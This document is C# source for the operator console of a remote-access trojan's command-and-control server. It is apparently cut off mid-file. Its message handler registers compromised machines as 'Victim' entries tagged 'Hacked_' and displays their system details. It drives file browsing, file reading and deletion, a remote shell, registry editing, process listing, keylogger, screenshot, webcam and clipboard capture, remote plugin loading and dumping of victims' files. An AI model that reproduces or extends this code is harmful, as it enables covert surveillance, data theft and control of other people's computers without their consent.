using ICSharpCode.TextEditor;
using System;
using System.Configuration;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Reflection;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms.VisualStyles;

namespace Reception
{
    public partial class Form1 : Form
    {
        //SERVER STATUS
        public SS ss;

        //CONFIGURATION
        int thd_count = 20;
        string title;

        Listener server;
        List<TabPage> tabs = new List<TabPage>();
        Dictionary<string, TabPage> tabs_dict = new Dictionary<string, TabPage>();

        //UPLOAD FILE
        frmFileTransferStatus f_ft;

        Dictionary<Victim, TreeNode> Upload_Node = new Dictionary<Victim, TreeNode>();
        int chunk_length = 1024 * 1024; //UPLOAD FILE CHUNK

        //DOWNLOAD FILE
        Dictionary<Victim, UDF_Code> Download_Status = new Dictionary<Victim, UDF_Code>();
        Dictionary<Victim, int> df_offset = new Dictionary<Victim, int>();

        //DELETE FILE STATUS
        Dictionary<Victim, List<string>> delete_task = new Dictionary<Victim, List<string>>();

        public Form1()
        {
            InitializeComponent();
        }

        //DLL IMPORT
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.Winapi)]
        internal static extern IntPtr GetFocus();

        private Control GetFocusedControl()
        {
            Control focused_control = null;
            IntPtr focus_handle = GetFocus();
            if (focus_handle != IntPtr.Zero)
                focused_control = Control.FromHandle(focus_handle);

            return focused_control;
        }

        //CLIENT AND SERVER [START]
        //RECEIVE EVENT
        public void Received(Listener l, Victim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec)
        {
            string msg = Crypto.AESDecrypt(buffer.MessageData, v._AES.Key, v._AES.IV);
            msg = Encoding.UTF8.GetString(Convert.FromBase64String(msg));
            string[] _split = msg.Split('|');
            string type = _split[0];
            try
            {
                if (type == "Basic")
                {
                    string onlineID = $"Hacked_{_split[1]}";
                    v.ID = onlineID;

                    string[] infos = new string[]
                    {
                        _split[2], //STATUS
                        v.rAddr, //REMOTE ADDRESS
                        "NULL-NULL-NULL", //LOCATION
                        _split[3], //OPERATION SYSTEM
                        _split[4], //CPU OVER MEMORY
                        _split[5], //IS ADMIN?
                        _split[6], //PAYLOAD
                        _split[7], //WEBCAM?
                        _split[8], //DESKTOP?
                    };

                    bool unix_like = !_split[3].ToLower().Contains("windows");
                    v.unix_like = unix_like;

                    //UNDATE INFORMATION
                    if (C2.Victims.Keys.Contains(onlineID))
                    {
                        ListViewItem _item = null;
                        listView2.Invoke(new Action(() =>
                        {
                            _item = listView2.FindItemWithText(onlineID);
                            for (int i = 0; i < infos.Length; i++)
                                _item.SubItems[i + 1].Text = infos[i];
                        }));
                        return;
                    }

                    //ADD NEW ITEM
                    ListViewItem item = new ListViewItem(onlineID); //ONLINE ID
                    item.Tag = v;
                    foreach (string info in infos)
                        item.SubItems.Add(info);
                    bool unix_line = !_split[3].ToLower().Contains("windows");
                    listView2.Invoke(new Action(() =>
                    {
                        listView2.Items.Add(item);
                        TreeNode node = new TreeNode($"{_split[1]}@{v.rAddr}");
                        string path = @"Victim\";
                        if (_split[3].ToLower().Contains("linux"))
                            path += "Linux";
                        else if (_split[3].ToLower().Contains("windows"))
                            path += "Windows";
                        TreeNode _node = FindTreeNodeByFullPath(treeView1.Nodes, path);
                        node.ImageIndex = 3;
                        _node.Nodes.Add(node);
                        treeView1.ExpandAll();
                    }));

                    string victim_folder = Path.Combine(Application.StartupPath, "Victim", onlineID);
                    if (!Directory.Exists(victim_folder))
                    {
                        Directory.CreateDirectory(victim_folder);
                        foreach (string folder in new string[] { "Downloads" })
                            Directory.CreateDirectory(Path.Combine(victim_folder, folder));
                    }

                    C2.Victims.Add(onlineID, new string[] { null, null });

                    //STATUS
                    SystemStatus($"New client [ {v.ID}@{v.rAddr}:{v.rPort} ] is online.");
                }
                else if (type == "Details")
                {
                    TabPage page = FindTabPage(v, Function.Details);
                    ListView lv = page.Controls[0] as ListView;
                    Invoke(new Action(() => lv.Items.Clear()));

                    string payload = _split[1];
                    foreach (string item in payload.Split(','))
                    {
                        string info = C1.B64StrD2Str(item);
                        string group = info.Split(':')[0];
                        string _info = info.Split(':')[1];

                        ListViewGroup lv_group = new ListViewGroup(group);
                        if (!string.IsNullOrEmpty(_info))
                        {
                            string v1 = C1.B64StrD2Str(_info);
                            foreach (string pair in v1.Split(','))
                            {
                                string[] _pair = pair.Split(':');
                                ListViewItem _item = new ListViewItem(_pair[0]);
                                _item.SubItems.Add(C1.B64StrD2Str(_pair[1]));
                                lv_group.Items.Add(_item);
                                Invoke(new Action(() => lv.Items.Add(_item)));
                            }
                        }
                        Invoke(new Action(() => lv.Groups.Add(lv_group)));
                    }
                }
                else if (type == "File")
                {
                    TabPage page = FindTabPage(v, Function.FileManager);

                    string command = _split[1];
                    if (command == "i" || command == "sd")
                    {
                        TextBox txt = page.Controls[0] as TextBox;
                        SplitContainer sc = page.Controls[1] as SplitContainer;
                        TreeView tv = sc.Panel1.Controls[0] as TreeView;
                        ListView lv = sc.Panel2.Controls[0] as ListView;
                        StatusStrip ss = page.Controls[2] as StatusStrip;
                        ToolStripStatusLabel tssl = ss.Items[0] as ToolStripStatusLabel;
                        if (command == "i")
                        {
                            string cp = _split[2];
                            string b64_payload = _split[3];
                            string drive_str = _split[4];
                            string payload = Encoding.UTF8.GetString(Convert.FromBase64String(b64_payload));
                            txt.Invoke(new Action(() => txt.Text = cp));
                            tv.Invoke(new Action(() =>
                            {
                                tv.Nodes.Clear();
                                lv.Tag = cp;
                                cp = cp.Replace("\\", "/") + "/";
                                string[] cp_split = cp.Split('/');
                                TreeNode root = null;
                                if (cp_split[0].Contains(":")) //Windows
                                {
                                    foreach (string d in drive_str.Split('+'))
                                        tv.Nodes.Add(new TreeNode(d + ":") { ImageIndex = 1 });
                                    root = FindTreeNodeByFullPath(tv.Nodes, cp_split[0]);
                                }
                                else //Unix like
                                {
                                    root = new TreeNode("/") { ImageIndex = 1 };
                                    tv.Nodes.Add(root);
                                    cp_split = cp_split.Where(x => x != cp_split[0]).ToArray();
                                }
                                ResursionAddTreeNodePath(cp_split, root, true);
                            }));
                        } //INITIALIZATION
                        if (command == "i" || command == "sd")
                        {
                            lv.Invoke(new Action(() =>
                            {
                                string b64_payload = null;
                                if (command == "i")
                                    b64_payload = _split[3];
                                else if (command == "sd")
                                    b64_payload = _split[2];
                                string payload = Encoding.UTF8.GetString(Convert.FromBase64String(b64_payload));
                                lv.Items.Clear();

                                int file_count = 0;
                                int folder_count = 0;
                                foreach (string v1 in payload.Split('+'))
                                {
                                    string[] v2 = v1.Split('|');
                                    string[] v3 = v2.Select(x => x.Split(':')[1]).ToArray();
                                    string b64_filename = v2[0].Replace("path:", string.Empty);
                                    string filename = Encoding.UTF8.GetString(Convert.FromHexString(b64_filename));

                                    string name = "";
                                    if (txt.Text.Contains(":")) //Windows
                                    {
                                        name = Path.GetFileName(filename);
                                    }
                                    else
                                    {
                                        string[] name_split = filename.Split('/');
                                        name = name_split[name_split.Length - 1];
                                        if (string.IsNullOrEmpty(name))
                                            name = "/";
                                    }

                                    ListViewItem item = new ListViewItem(name);
                                    string type = v3[1].Contains("d") ? "Folder" : "File";
                                    string ext = Path.GetExtension(filename);
                                    C1.GetIcon(string.IsNullOrEmpty(ext) ? "txt" : ext);
                                    if (type == "File")
                                    {
                                        item.ImageKey = string.IsNullOrEmpty(ext) ? "txt" : ext;
                                        file_count++;
                                    }
                                    else if (type == "Folder")
                                    {
                                        item.ImageIndex = 0;
                                        folder_count++;
                                    }
                                    item.Tag = new string[] { type, filename };
                                    for (int i = 1; i < v3.Length; i++)
                                        item.SubItems.Add(v3[i]);

                                    if (type == "File")
                                        lv.Items.Add(item);
                                    else if (type == "Folder")
                                        lv.Items.Insert(folder_count - 1, item);

                                    TreeNode selected_node = tv.SelectedNode;
                                    if (type == "Folder" && selected_node != null)
                                    {
                                        string tmp_filename = filename;
                                        if (!txt.Text.Contains(":")) //Unix like
                                            tmp_filename = "/" + tmp_filename.Replace("//", "/").Replace("/", "\\");
                                        TreeNode existed_node = FindTreeNodeByFullPath(selected_node.Nodes, tmp_filename);
                                        if (existed_node == null)
                                        {
                                            TreeNode _node = new TreeNode(name);
                                            _node.ImageIndex = 0;
                                            selected_node.Nodes.Add(_node);
                                        }
                                    }
                                }
                                if (tv.SelectedNode != null)
                                {
                                    if (txt.Text.Contains(":")) //Windows
                                        txt.Text = tv.SelectedNode.FullPath;
                                    else //Unix like
                                        txt.Text = tv.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
                                    lv.Tag = txt.Text;
                                }

                                tv.Sort();
                                tv.ExpandAll();
                                tssl.Text = $"Action successfully! | Folder[{folder_count}] File[{file_count}]";
                            }));
                        } //ADD FOLDER AND FILE ENTRIES
                    }
                    else if (command == "rf") //READ FILE
                    {
                        string path = _split[2];
                        string content = Encoding.UTF8.GetString(Convert.FromBase64String(_split[3]));
                        page = FindTabPage(v, Function.ReadFile, path);
                        tabControl2.Invoke(new Action(() =>
                        {
                            tabControl2.SelectedTab = page;

                            TextBox tb1 = (TextBox)page.Controls[0];
                            TextEditorControl editor = (TextEditorControl)page.Controls[1];
                            TextBox tb2 = (TextBox)page.Controls[2];
                            StatusStrip ss = (StatusStrip)page.Controls[3];
                            ToolStripStatusLabel l1 = (ToolStripStatusLabel)ss.Items[0];
                            ToolStripStatusLabel l2 = (ToolStripStatusLabel)ss.Items[1];
                            ToolStripStatusLabel l3 = (ToolStripStatusLabel)ss.Items[2];

                            tb1.Text = path;
                            editor.Text = content;
                            int length = content.Length;
                            int line = editor.Document.TotalNumberOfLines;

                            tb2.Text = "Search something...";
                            l1.Text = "Action successfully!";
                            l2.Text = $"Size[{length}]";
                            l3.Text = $"Line[{line}]";
                        }));
                    }
                    else if (command == "uf") //UPLOAD FILE
                    {
                        
                    }
                    else if (command == "df") //DOWNLOAD FILE
                    {
                        
                    }
                    else if (command == "wf") //WRITE FILE
                    {
                        string path = Encoding.UTF8.GetString(Convert.FromBase64String(_split[2]));
                        string status = _split[3];
                        tabControl2.Invoke(new Action(() =>
                        {
                            TabPage _page = tabControl2.SelectedTab;
                            StatusStrip ss = (StatusStrip)_page.Controls[3];
                            ToolStripStatusLabel tssl_1 = (ToolStripStatusLabel)ss.Items[0];
                            if (status == "1") //DONE
                            {
                                tssl_1.Text = $"Write file successfully! | {path}";
                            }
                            else if (status == "0") //ERROR
                            {
                                string err_msg = Encoding.UTF8.GetString(Convert.FromBase64String(_split[4]));
                                MessageBox.Show(err_msg, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                tssl_1.Text = $"Write faile failed...";
                            }
                        }));
                    }
                    else if (command == "del") //DELETE FILE
                    {
                        string status = _split[2];
                        string path = _split[3];
                        string _msg = _split[4];
                        if (status == "0") MessageBox.Show("ERROR://" + _msg, "Delete File", MessageBoxButtons.OK, MessageBoxIcon.Error);

                        delete_task[v].Remove(path);
                        if (delete_task[v].Count == 0)
                        {
                            MessageBox.Show("All delete file task is finished!", "Delete File", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            delete_task.Remove(v);
                            FileListViewRefresh();
                        }
                    }
                    else if (command == "img")
                    {
                        string img_path = _split[2];
                        string status = _split[3];
                        string img_b64str = _split[4];
                        Form f = FindActiveForm(v, Function.ShowImage);
                        try
                        {
                            if (f == null)
                                return;

                            frmFileImage _f = (frmFileImage)f;
                            Image img = C1.B64StrC2Img(img_b64str);
                            _f.NewImage(img_path, img, img_b64str);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message);
                        }
                    }
                    else if (command == "af_c") //ARCHIVE FILE - COMPRESS
                    {
                        string archive_file = _split[2];
                        string status = _split[3];
                        if (status != "1") //CHECK ERROR
                        {
                            string err_msg = C1.B64StrD2Str(_split[4]);
                            MessageBox.Show(err_msg, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        MessageBox.Show($"Compress successfully\nPath : {archive_file}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        tabControl2.Invoke(new Action(() => FileListViewRefresh()));
                    }
                    else if (command == "af_e") //ARCHIVE FILE - EXTRACT
                    {
                        string op_code = _split[2];
                        string status = _split[3];
                        string payload = _split[4];
                        if (status != "1")
                        {
                            payload = C1.B64StrD2Str(payload);
                            MessageBox.Show(payload, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        if (op_code == "0") //FILE MANAGER
                        {
                            MessageBox.Show($"Extract successfully\nPath : {payload}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            tabControl2.Invoke(new Action(() => FileListViewRefresh()));
                        }
                        else if (op_code == "1") //REMOTE PLUGIN
                        {
                            string module_name = Path.GetFileName(payload);
                            v.RunPayload("RemotePlugin", v, new string[]
                            {
                                "l",
                                module_name, //MODULE NAME
                                "version", //VERSION
                                payload, //MODULE DIR
                                "" , //IMPORT EXECUTION PAYLOAD
                            });
                        }
                    }
                    else if (command == "wget") //WGET
                    {
                        frmWGET f_wget = (frmWGET)FindActiveForm(v, Function.WGET);
                        if (f_wget == null) return;

                        string status = _split[2];
                        string url = _split[3];
                        string file = _split[4];
                        string result = status == "1" ? "OK" : "Failed";
                        f_wget.UpdateResult(C1.B64StrD2Str(url), C1.B64StrD2Str(file), result);
                    }
                    else if (command == "n_f") //NEW FOLDER
                    {
                        string code = _split[2];
                        if (code != "1")
                        {
                            string err = C1.B64StrD2Str(_split[3]);
                            MessageBox.Show(err, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        FileListViewRefresh();
                        string path = _split[3];
                        MessageBox.Show("Create new folder successfully: " + path, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else if (command == "n_t") //NEW FILE
                    {
                        string code = _split[2];
                        if (code != "1")
                        {
                            string err = C1.B64StrD2Str(_split[3]);
                            MessageBox.Show(err, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        FileListViewRefresh();
                        string path = _split[3];
                        MessageBox.Show("Create new file successfully: " + path, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else if (command == "g") //GOTO
                    {
                        string code = _split[2];
                        string path = _split[3];
                        if (code != "1")
                        {
                            MessageBox.Show("Path not exists : " + path, "Not such directory", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            Invoke(new Action(() =>
                            {
                                var x = file_GetControls();
                                x.tb.Text = x.lv.Tag.ToString();
                            }));
                            return;
                        }

                        Invoke(new Action(() =>
                        {
                            var x = file_GetControls();
                            TreeNode node = FindTreeNodeByFullPath(x.tv.Nodes, path);
                            path = path.Replace("\\", "/");
                            string[] path_split = path.Split('/');

                            TreeNode nearest_node = null;
                            int max_index = path_split.Length - 1;
                            int i = path_split.Length - 1;
                            while (nearest_node == null)
                            {
                                nearest_node = FindTreeNodeByFullPath(x.tv.Nodes, string.Join("\\", path_split[0..i--]));
                            }
                            if (node == null) ResursionAddTreeNodePath(path_split[(i + 1)..(max_index + 1)], nearest_node, v.unix_like);

                            node = FindTreeNodeByFullPath(nearest_node.Nodes, path.Replace("/", "\\"));
                            nearest_node.Expand();
                            x.tv.SelectedNode = node;
                        }));
                    }
                }
                else if (type == "Shell")
                {
                    //string cd = _split[1];
                    string result = Encoding.UTF8.GetString(Convert.FromBase64String(_split[1]));
                    string cd = Encoding.UTF8.GetString(Convert.FromBase64String(_split[2]));
                    tabControl2.Invoke(new Action(() =>
                    {
                        TabPage page = tabControl2.SelectedTab;
                        Victim v = (Victim)((object[])page.Tag)[0];
                        v.shell_cd = cd;
                        TextBox prompt_tb = page.Controls[1] as TextBox;
                        prompt_tb.AppendText(result);
                        int index = prompt_tb.Text.Length - 1;
                        prompt_tb.Tag = index;
                        prompt_tb.SelectionStart = index;
                        prompt_tb.Focus();
                        //prompt_tb.AppendText(cd);
                    }));
                }
                else if (type == "RegEdit")
                {
                    string command = _split[1];
                    string payload = C1.B64StrD2Str(_split[2]);
                    string[] _s = payload.Split('|');
                    string status = _s[0];
                    string p = _s[1];

                    var _var = reg_GetControls();

                    if (command == "i") //INITIALIZATION
                    {
                        if (status == "1")
                            foreach (string i in p.Split(','))
                                _var.tv.Invoke(new Action(() => _var.tv.Nodes.Add(new TreeNode(C1.B64StrD2Str(i)))));
                        else
                            MessageBox.Show(Encoding.UTF8.GetString(Convert.FromBase64String(p)));
                    }
                    else if (command == "l") //LIST
                    {
                        //SUB KEYS
                        if (!string.IsNullOrEmpty(p))
                        {
                            foreach (string i in p.Split(','))
                            {
                                string v1 = Encoding.UTF8.GetString(Convert.FromBase64String(i));
                                _var.tv.Invoke(new Action(() =>
                                {
                                    TreeNode selected_node = _var.tv.SelectedNode;
                                    string[] existed_keys = selected_node.Nodes.Cast<TreeNode>().Select(x => x.Text).ToArray();

                                    if (!existed_keys.Contains(v1))
                                    {
                                        TreeNode node = new TreeNode(v1);
                                        selected_node.Nodes.Add(node);
                                    }
                                }));
                            }
                        }
                        Invoke(new Action(() => _var.tv.Sort()));

                        //VALUES
                        if (!string.IsNullOrEmpty(_s[2]))
                        {
                            foreach (string v1 in _s[2].Split(','))
                            {
                                string[] v2 = Encoding.UTF8.GetString(Convert.FromBase64String(v1)).Split(',');
                                string name = C1.B64StrD2Str(v2[0]);
                                string reg_type = C1.B64StrD2Str(v2[1]);
                                string reg_data = C1.B64StrD2Str(v2[2]);

                                ListViewItem item = new ListViewItem(name);
                                item.SubItems.Add(reg_type);
                                item.SubItems.Add(reg_data);
                                item.ImageIndex = (reg_type.Contains("SZ") ? 7 : 8);
                                _var.lv.Invoke(new Action(() => _var.lv.Items.Add(item)));
                            }
                        }

                        _var.tv.Invoke(new Action(() =>
                        {
                            TreeNode selected_node = _var.tv.SelectedNode;
                            if (selected_node == null)
                                selected_node = FindTreeNodeByFullPath(_var.tv.Nodes, _var.lv.Tag.ToString());

                            selected_node.Expand();
                            _var.lv.Sort();
                        }));
                    }
                    else if (command == "s") //SET KEY/VALUE
                    {
                        Invoke(new Action(() =>
                        {

                        }));
                    }
                    else if (command == "nk") //NEW KEY
                    {
                        if (_s[0] != "1")
                        {
                            MessageBox.Show(C1.B64StrD2Str(_s[1]), "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        MessageBox.Show("Create new key successfully: " + _s[1], "RegEdit OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        reg_Refresh();
                    }
                    else if (command == "nv") //NEW VALUE
                    {
                        if (_s[0] != "1")
                        {
                            MessageBox.Show(C1.B64StrD2Str(_s[1]), "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }

                        MessageBox.Show("Set value successfully: " + $"{_s[3]} at {Path.Combine(_s[1], _s[2])}", "RegEdit OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        reg_Refresh();
                    }
                    else if (command == "g") //GOTO PATH
                    {

                    }
                    else if (command == "ex") //EXPORT
                    {

                    }
                    else if (command == "im") //IMPORT
                    {

                    }
                }
                else if (type == "WMIC")
                {
                    string method = _split[1];
                    string status = _split[2];
                    string b64_payload = _split[3];
                    string payload = C1.B64StrD2Str(b64_payload);

                    if (status != "1")
                    {
                        ErrorLogs(payload);
                        MessageBox.Show(payload, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                    tabControl2.Invoke(new Action(() =>
                    {
                        TabPage page = FindTabPage(v, Function.WMIC);
                        RichTextBox prompt = page.Controls[0] as RichTextBox;
                        prompt.AppendText(payload);
                        prompt.AppendText("\n");
                        prompt.AppendText("> ");
                        prompt.Tag = prompt.Text.Length;
                    }));
                }
                else if (type == "M") //MANAGER
                {
                    string command = _split[1];
                    string status = _split[2];
                    string b64_payload = _split[3];
                    string payload = Encoding.UTF8.GetString(Convert.FromBase64String(b64_payload));
                    if (status != "1")
                    {
                        MessageBox.Show(payload, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    if (command == "lp") //LIST PROCESS
                    {
                        var _var = proc_GetControls();
                        foreach (string proc in payload.Split(','))
                        {
                            string[] p = null;
                            string[] c = null;
                            string v1 = C1.B64StrD2Str(proc);
                            if (v1.Contains("."))
                            {
                                p = v1.Split('.')[0].Split(',');
                                c = C1.B64StrD2Str(v1.Split('.')[1]).Split(',');
                            }
                            else
                                p = v1.Split(',');

                            string pid = C1.B64StrD2Str(p[0]);
                            string name = C1.B64StrD2Str(p[1]);
                            string path = C1.B64StrD2Str(p[2]);

                            tabControl2.Invoke(new Action(() =>
                            {
                                ListViewItem item = new ListViewItem(pid);
                                item.SubItems.Add(name);
                                item.SubItems.Add(path);

                                _var.lv.Items.Add(item);

                                TreeNode parent_node = new TreeNode($"{name}({pid})");
                                parent_node.Tag = new object[] { pid, name, path };
                                _var.tv.Nodes.Add(parent_node);

                                if (c != null)
                                {
                                    if (c.Length > 0)
                                    {
                                        foreach (string child in c)
                                        {
                                            try
                                            {
                                                string[] cs = child.Split('|'); //CHILD SPLIT
                                                string child_pid = C1.B64StrD2Str(cs[0]);
                                                string child_name = C1.B64StrD2Str(cs[1]);
                                                string child_path = C1.B64StrD2Str(cs[2]);

                                                TreeNode child_node = new TreeNode($"{child_name}({child_pid})");
                                                child_node.Tag = new object[] { child_pid, child_name, child_path };
                                                parent_node.Nodes.Add(child_node);
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        parent_node.Expand();
                                    }
                                }

                                _var.ss.Items[0].Text = $"Action successfully! Process[{_var.lv.Items.Count}]";
                            }));
                        }
                    }
                    else if (command == "ls") //LIST SERVICE
                    {
                        tabControl2.Invoke(new Action(() => tabControl2.SelectedTab = FindTabPage(v, Function.Service)));
                        var _var = serv_GetControls();
                        foreach (string i in payload.Split(','))
                        {
                            string[] s = C1.B64StrD2Str(i).Split(',');
                            ListViewItem item = new ListViewItem(C1.B64StrD2Str(s[0]));
                            for (int j = 1; j < s.Length; j++)
                                item.SubItems.Add(C1.B64StrD2Str(s[j]));
                            _var.lv.Invoke(new Action(() => _var.lv.Items.Add(item)));
                        }
                        _var.ss.Invoke(new Action(() => _var.ss.Items[0].Text = $"Action successfully! Service[{_var.lv.Items.Count}]"));
                    }
                    else if (command == "lc") //LIST CONNECTION
                    {
                        Invoke(new Action(() =>
                        {
                            TabPage page = FindTabPage(v, Function.Connection);
                            tabControl2.SelectedTab = page;
                            var _var = conn_GetControls();
                            foreach (string i in payload.Split(','))
                            {
                                string[] s = C1.B64StrD2Str(i).Split(',');
                                ListViewItem item = new ListViewItem(s[0]);
                                for (int j = 1; j < s.Length; j++)
                                    item.SubItems.Add(s[j]);
                                _var.lv.Items.Add(item);
                            }
                            _var.ss.Items[0].Text = $"Action successfully ! Connection[{_var.lv.Items.Count}]";
                        }));
                    }
                }
                else if (type == "pip_Mgr")
                {
                    TabPage page = FindTabPage(v, Function.pip_Manager);
                    if (page == null) return;
                    string command = _split[1];
                    string status = _split[2];
                    string b64_payload = _split[3];

                    if (status != "1")
                    {
                        MessageBox.Show(C1.B64StrD2Str(b64_payload), "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    if (command == "l")
                    {
                        Invoke(new Action(() =>
                        {
                            tabControl2.SelectedTab = page;
                            string payload = C1.B64StrD2Str(b64_payload);
                            var _var = pip_GetControls(v);
                            foreach (string line in payload.Split('\n'))
                            {
                                string _line = line.Trim();
                                if (string.IsNullOrEmpty(_line)) continue;

                                string[] s = _line.Split(new string[] { "==" }, StringSplitOptions.None);
                                ListViewItem item = new ListViewItem(s[0]);
                                item.SubItems.Add(s[1]);
                                _var.lv.Items.Add(item);
                            }
                            _var.ss.Items[0].Text = $"Action successfully! Packages[{_var.lv.Items.Count}]";
                        }));
                    }
                }
                else if (type == "kl") //KEY LOGGER
                {
                    string cmd = _split[1];
                    string status = _split[2];
                    string b64_payload = _split[3];
                    string payload = C1.B64StrD2Str(b64_payload);
                    if (status != "1")
                    {
                        MessageBox.Show(payload, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    if (cmd == "i") //INSTALL
                    {

                    }
                }
                else if (type == "Mon") //MONITOR
                {
                    string cmd = _split[1];
                    string status = _split[2];
                    string b64_payload = _split[3];
                    if (status != "1")
                    {
                        string err = C1.B64StrD2Str(b64_payload);
                        MessageBox.Show(err, "Monitor", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    var _var = monitor_GetControls();
                    if (cmd == "s") //SCREEN SHOT
                    {
                        _var.pb.Image = C1.B64StrC2Img(b64_payload);
                    }
                    else if (cmd == "m_start")
                    {

                    }
                    else if (cmd == "m_stop")
                    {

                    }
                }
                else if (type == "WebCam")
                {
                    string cmd = _split[1];
                    if (cmd == "c") //CAPTURE
                    {
                        string code = _split[2];
                        if (code != "1")
                        {
                            return;
                        }

                        string img_b64 = _split[3];
                        Invoke(new Action(() =>
                        {
                            var _var = webcam_GetControls(v);
                            _var.pb.Image = C1.B64StrC2Img(img_b64);
                        }));
                    }
                }
                else if (type == "cb") //CLIPBOARD
                {
                    string code = _split[1];
                    string payload = C1.B64StrD2Str(_split[2]);
                    if (code != "1")
                    {
                        //IT MIGHT ALWAYS OCCUR.
                        return;
                    }

                    TabPage page = FindTabPage(v, Function.Clipboard);
                    if (page != null)
                    {
                        var x = cb_GetControls(v);
                        string date = DateTime.Now.ToString("F");
                        Invoke(new Action(() =>
                        {
                            ListViewItem item = null;
                            if (x.lv.Items.Count == 0)
                            {
                                item = new ListViewItem(date);
                                item.Tag = payload;
                                x.lv.Items.Add(item);
                            }
                            else
                            {
                                item = x.lv.Items[x.lv.Items.Count - 1];
                                if (item.Tag.ToString() != payload)
                                {
                                    item = new ListViewItem(date);
                                    item.Tag = payload;
                                    x.lv.Items.Add(item);
                                }
                            }
                        }));
                    }
                }
                else if (type == "es") //EVAL SCRIPT
                {

                }
                else if (type == "rPlugin") //REMOTE PLUGIN
                {
                    string cmd = _split[1];
                    string[] ps = C1.B64StrD2Str(_split[2]).Split('|'); //PAYLOAD SPLITED
                    string status = ps[0];
                    string payload = C1.B64StrD2Str(ps[1]);

                    if (status != "1")
                    {
                        MessageBox.Show(payload, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    var _var = rPlugin_GetControls(v);
                    if (cmd == "i") //INITIALIZATION
                    {
                        Invoke(new Action(() =>
                        {
                            _var.t.Text = payload;
                            _var.ss.Items[0].Text = "Initialization completed, temp folder created : " + payload;
                        }));

                        v.RunPayload("RemotePlugin", v, new string[] { "ls" });
                    }
                    else if (cmd == "l") //LOAD MODULE
                    {
                        MessageBox.Show(payload);
                    }
                    else if (cmd == "re") //RELOAD MODULE
                    {

                    }
                    else if (cmd == "ls") //LIST MODULE
                    {
                        foreach (string v1 in payload.Split(','))
                        {
                            string v2 = C1.B64StrD2Str(v1);
                            string[] s = v2.Split(',');
                            string module = s[0];
                            string[] info = s[1].Split('.').Select(x => C1.B64StrD2Str(x)).ToArray(); //KEY:VALUE

                            ListViewItem item = new ListViewItem(info[0].Split('\'')[1]);
                            for (int i = 1; i < info.Length; i++) item.SubItems.Add(info[i].Split('\'')[1]);

                            if (item.SubItems[1].Text.Contains("pip")) item.Tag = new object[] { rp_Type.PIP };
                            else item.Tag = new object[] { rp_Type.REMOTE };

                            Invoke(new Action(() => _var.lv.Items.Add(item)));
                        }
                        Invoke(new Action(() => _var.ss.Items[0].Text = $"Action successfully! Module[{_var.lv.Items.Count}]"));
                    }
                    else if (cmd == "r") //REMOVE MODULE
                    {

                    }
                }
                else if (type == "Console")
                {
                    string output = C1.B64StrD2Str(_split[1]);
                    var _var = fram_GetControls(v);
                    Invoke(new Action(() =>
                    {
                        if (output.Contains("[*]"))
                        {
                            string[] str_split = output.Split(new string[] { "[*]" }, StringSplitOptions.None);
                            _var.rt.AppendText(str_split[0]);
                            _var.rt.SelectionColor = Color.CornflowerBlue;
                            _var.rt.AppendText("[*]");
                            _var.rt.SelectionColor = Color.White;
                            output = str_split[1];
                        }
                        else if (output.Contains("[+]"))
                        {
                            string[] str_split = output.Split(new string[] { "[+]" }, StringSplitOptions.None);
                            _var.rt.AppendText(str_split[0]);
                            _var.rt.SelectionColor = Color.LimeGreen;
                            _var.rt.AppendText("[+]");
                            _var.rt.SelectionColor = Color.White;
                            output = str_split[1];
                        }
                        else if (output.Contains("[-]"))
                        {
                            string[] str_split = output.Split(new string[] { "[-]" }, StringSplitOptions.None);
                            _var.rt.AppendText(str_split[0]);
                            _var.rt.SelectionColor = Color.Red;
                            _var.rt.AppendText("[-]");
                            _var.rt.SelectionColor = Color.White;
                            output = str_split[1];
                        }

                        _var.rt.AppendText($"{output}\n");
                        _var.rt.ScrollToCaret();
                    }));
                }
                else if (type == "ConsoleFile")
                {
                    string filename = _split[1];
                    string file_b64 = _split[2];
                    string save_dir = Path.Combine(Application.StartupPath, "Victim", v.ID, "Dump");
                    if (!Directory.Exists(save_dir)) Directory.CreateDirectory(save_dir);
                    string save_file = Path.Combine(save_dir, Path.GetFileName(filename));
                    using (FileStream fs = File.Open(save_file, FileMode.Create))
                    {
                        fs.Write(C1.B64StrD2Byte(file_b64));
                        MessageBox.Show("Save file: " + save_file, "Action successfully", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                else if (type == "ERROR")
                {
                    string payload = C1.B64StrD2Str(_split[1]);
                    Invoke(new Action(() =>
                    {
                        tabControl4.SelectedTab = tabPage8;
                        ErrorLogs(payload);
                    }));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        //DISCONNECT EVENT
